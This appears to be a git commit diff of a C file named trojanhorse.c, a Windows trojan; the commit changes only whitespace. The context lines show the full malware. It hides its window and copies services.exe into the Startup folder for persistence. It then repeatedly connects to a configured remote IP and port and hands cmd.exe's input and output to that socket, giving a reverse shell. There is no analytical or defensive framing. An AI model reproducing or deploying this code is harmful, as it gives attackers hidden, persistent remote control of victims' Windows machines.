97e61350121d45c40bf9c01092c1a5e9526b80a2
Matheus De Jesus Pereira <92840509+TeuZero@users.noreply.github.com>
2024-01-10 10:45:42 -0300

    trojanhorse.c

--- trojanhorse.c
+++ trojanhorse.c
@@ -11,22 +11,19 @@ STARTUPINFO theProcess;
 PROCESS_INFORMATION info_proc;
 struct sockaddr_in Winsocket_Structure;
 
-
 int main(int argc, char *argv[])
 {
  ShowWindow(GetForegroundWindow(),SW_HIDE);
  system("XCOPY /Y services.exe C:\\ProgramData\\Microsoft\\Windows\\\"Start Menu\"\\Programs\\Startup");
 
  while(1)
- {
-      
+ {     
   WSAStartup(MAKEWORD(2,2), &wsaData);
   Winsocket=WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP,NULL, (unsigned int) NULL, (unsigned int) NULL);
   Winsocket_Structure.sin_port=htons(DEFAULT_PORT);
   Winsocket_Structure.sin_family=AF_INET;
   Winsocket_Structure.sin_addr.s_addr=inet_addr(DEFAULT_IP );
   
-
   if(Winsocket==INVALID_SOCKET)
   {
     WSACleanup();
@@ -38,20 +35,12 @@ int main(int argc, char *argv[])
   {
     WSACleanup();
   }
-  
-  
-  //srw
 
   memset(&theProcess, 0, sizeof(theProcess));
-
   theProcess.cb=sizeof(theProcess);
   theProcess.dwFlags=STARTF_USESTDHANDLES;
   theProcess.hStdInput = theProcess.hStdOutput = theProcess.hStdError = (HANDLE)Winsocket;
-
-
-  CreateProcess(NULL,"cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &theProcess, &info_proc);
-  
- 
+  CreateProcess(NULL,"cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &theProcess, &info_proc);  
   }
  
 }
